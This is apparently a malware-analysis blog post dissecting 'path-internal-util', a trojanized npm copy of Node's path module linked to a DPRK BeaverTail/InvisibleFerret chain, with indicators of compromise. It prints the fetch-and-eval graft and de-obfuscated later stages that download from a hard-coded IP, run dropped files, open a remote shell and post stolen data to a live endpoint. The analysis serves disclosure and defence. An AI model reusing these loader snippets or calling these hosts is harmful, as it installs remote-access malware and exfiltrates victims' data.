---
title: "path-internal-util: don't chase the URL, catch the shape"
date: 2026-06-09
summary: "It's the real Joyent path module, verbatim, plus three lines that fetch a jsonkeeper paste and eval it — pull that thread and it unrolls into a live DPRK BeaverTail loader and a socket.io RAT."
packageName: path-internal-util
ecosystem: npm
---

<img src="/assets/images/path-internal-util-beavertail.jpg" alt="Meme: a close-up of an actual beaver's scaly tail on a rock, captioned with the SNL 'More Cowbell' line — 'I've got a fever, and the only prescription is more BEAVER TAIL.' The chain's payload is, in fact, more BeaverTail." style="width: 60%; height: auto;">

Nobody reads Node's `path` module. It splits filenames, it has shipped unchanged for years, and it is the last place anyone looks for trouble — which is exactly why someone copied it, byte for byte, onto npm and slipped three lines inside. Those lines turn an ordinary import into a call to a free pastebin, and they run whatever the pastebin hands back; the technique is dull copy-paste, but it doesn't matter, because the package gives itself away long before anyone reads the URL.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `path-internal-util` |
| Version | `1.0.2` |
| Description | `Node.js path module` |
| Author | *(empty)* |
| License | `ISC` |
| Main | `./path.js` |
| Dependencies | `axios`, `execp`, `fs@0.0.1-security`, `process`, `request`, `path@0.12.7`, `util` |

## Stage 1 — the graft

The carrier is Joyent's original, untouched down to the copyright header. The graft is a single base64 string and a small function, fired by an unguarded wrapper at the foot of the file — so importing the package is enough, with no install hook for an audit to catch.

<pre class="lang-js"><code><span class="tok-kw">var</span> tokenStringRe = <span class="tok-str">"aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ=="</span>;  <span class="tok-com">// → jsonkeeper.com/b/CWOV9</span>

<span class="tok-kw">function</span> <span class="tok-fn">loadTokenData</span> () {
  <span class="tok-fn">fetch</span>(<span class="tok-fn">atob</span>(tokenStringRe)).<span class="tok-fn">then</span>((t) =&gt; t.<span class="tok-fn">json</span>()).<span class="tok-fn">then</span>((data) =&gt; <span class="tok-fn">eval</span>(data.content));
}

(<span class="tok-kw">function</span> () { <span class="tok-fn">loadTokenData</span>(); })();   <span class="tok-com">// fires on require(); inert loadStringData() sibling left commented out</span>
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/trojanized/library/remote-eval` | verbatim Joyent source carrying an IIFE that `eval`s a fetched body |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/fetch-eval` | fetch → decode → parse → eval, to a literal pastebin URL |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/encoded` | base64 string decoded and executed in the same file |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/impersonation/core-module` | a package calling itself the path module while shipping an `execp` dependency |
| <span class="sev-dot suspicious" title="suspicious"></span> | `well-known/malware/stealer/beaver-tail` | the bare `execp` dependency — the Nickel Alley tell |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/dependency/facade` | declared dependencies the code never loads |

## Caught by shape, not the URL

The verdict above never touched the pastebin: five hostile traits fire in three separate corners of the taxonomy, each a fact about how the package is built rather than a string to blocklist.

- It ships a core module verbatim — copyright header, helpers, exports, all of it.
- It decodes, fetches, parses, and evaluates in four linked calls.
- It claims to be the path module yet loads only one of its seven declared dependencies.

Swap the pastebin, re-encode the string, impersonate a different core module — all three still fire. That is the line between catching a sample and catching a family.

## Following the thread

The pastebin was live, so we pulled it. The first hop returned obfuscated JavaScript that installs two HTTP libraries, beacons a hard-coded address with a campaign ID, saves the reply to disk, and runs it. The install command matches web-dotenv's from last month flag for flag — the same crew, reusing the same loader.

<pre class="lang-js"><code><span class="tok-com">// jsonkeeper CWOV9, de-obfuscated</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">"npm install axios socket.io-client --no-save --no-progress --loglevel silent"</span>);
axios.<span class="tok-fn">get</span>(<span class="tok-str">"http://216.126.225.83/api/service/55dfb627190b5091e5164c010d6c5c52"</span>)
  .<span class="tok-fn">then</span>((r) =&gt; { <span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"0001.dat"</span>), r.data); <span class="tok-fn">execSync</span>(<span class="tok-str">"node 0001.dat"</span>); });
</code></pre>

That address answered with a second blob whose only job is to drop a third — it writes a file and runs it, after wiring up handlers that swallow any crash on the way.

<pre class="lang-js"><code><span class="tok-com">// 0001.dat, de-obfuscated — the entire dropper</span>
<span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"scdata"</span>), payload, { flag: <span class="tok-str">"w+"</span> });
<span class="tok-fn">execSync</span>(<span class="tok-str">"node scdata"</span>, { windowsHide: <span class="tok-kw">true</span> });
</code></pre>

That last file, `scdata`, is the payoff: a remote-access trojan over a persistent socket, with an interactive shell, an SSH channel, and screenshots on demand. It stamps each packet with the same telemetry its siblings used, and ships the loot to an endpoint cleave already flags by name — Lazarus.

<pre class="lang-js"><code><span class="tok-com">// scdata — InvisibleFerret RAT (uid 55dfb627…, t='104')</span>
<span class="tok-kw">const</span> sock = <span class="tok-fn">require</span>(<span class="tok-str">"socket.io-client"</span>)(C2);
sock.<span class="tok-fn">on</span>(<span class="tok-str">"terminal-input"</span>, run);      <span class="tok-com">// interactive shell</span>
sock.<span class="tok-fn">on</span>(<span class="tok-str">"start_ssh"</span>, openSSH);         <span class="tok-com">// SSH pivot</span>
axios.<span class="tok-fn">post</span>(<span class="tok-str">"http://216.126.225.83/api/service/makelog"</span>, loot);   <span class="tok-com">// Lazarus exfil</span>
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/data-file` | the dropper: an obfuscated blob that launches a hidden Node child |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/remote-command/control` | the RAT: `terminal-output`, `terminal-resize`, remote command execution |
| <span class="sev-dot hostile" title="hostile"></span> | `well-known/malware/dropper/lazarus` | exfil to `/api/service/makelog` — the GlassWorm / Lazarus signature |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/install-hook/scripts/dynamic-install` | runtime install of `socket.io-client`, `sharp`, `screenshot-desktop` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/communications/ip/literal` | hard-coded `216.126.225.83` C2 |

## Attribution

This is North Korea's Contagious Interview operation — the BeaverTail loader dropping the InvisibleFerret trojan — and the recovered chain proves it at the toolkit level, not on a hunch. The install line, the campaign-ID URL scheme, the numbered drop file, and the stealer's telemetry are the same kit on the same Tier.Net range as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) and [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/), both already pinned to the group via [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). cleave reaches that verdict on its own when the exfil path trips its Lazarus rule; this is simply a fresh instance of the kit, same operator.

## Indicators

| Type | Value |
| --- | --- |
| Package | `path-internal-util@1.0.2` (npm) |
| npm page | [npmjs.com/package/path-internal-util](https://www.npmjs.com/package/path-internal-util) |
| Tarball SHA-256 | [`7d62ba9c7d79e4cb37a67311866645b88245840d765302bc79286a8e3c0f8a95`](https://lab.atomdrift.org/file/7d62ba9c7d79e4cb37a67311866645b88245840d765302bc79286a8e3c0f8a95) |
| `path.js` SHA-256 | [`98b01dc2b472069106e707749862ea5cfcd1bb2fb339dfeda28047ef1630cbaf`](https://lab.atomdrift.org/file/98b01dc2b472069106e707749862ea5cfcd1bb2fb339dfeda28047ef1630cbaf) |
| Stage 2 URL | `https://www.jsonkeeper.com/b/CWOV9` (base64: `aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ==`) |
| Stage 2 SHA-256 (snapshot) | [`3d4191faf32641523d277ea8ce36b6fede103e325773f36ab2208e82ed6c9031`](https://lab.atomdrift.org/file/3d4191faf32641523d277ea8ce36b6fede103e325773f36ab2208e82ed6c9031) |
| Stage 3 URL | `http://216.126.225.83/api/service/55dfb627190b5091e5164c010d6c5c52` (Tier.Net, `216.126.224.0/22`) |
| Stage 3 SHA-256 (snapshot) | [`aae780b19c4a99cf4f3a22267bc3020cd03900921e43ad69ae83b7b8ee76e17d`](https://lab.atomdrift.org/file/aae780b19c4a99cf4f3a22267bc3020cd03900921e43ad69ae83b7b8ee76e17d) |
| Stage 4 `scdata` SHA-256 (snapshot) | [`b9fbc752c940f7fcb4ce2ae1a70ed0b4890e9b4818d04e7c6df18102c8a49115`](https://lab.atomdrift.org/file/b9fbc752c940f7fcb4ce2ae1a70ed0b4890e9b4818d04e7c6df18102c8a49115) |
| Dropped files | `$TMPDIR/0001.dat`, `$TMPDIR/scdata`, `$TMPDIR/.npm/vhost.ctl` (pid lock) |
| Exfil endpoint | `http://216.126.225.83/api/service/makelog` |
| Campaign UID | `55dfb627190b5091e5164c010d6c5c52` (telemetry `t='104'`) |
| Facade dependency | `execp` (Nickel Alley / BeaverTail IOC) |
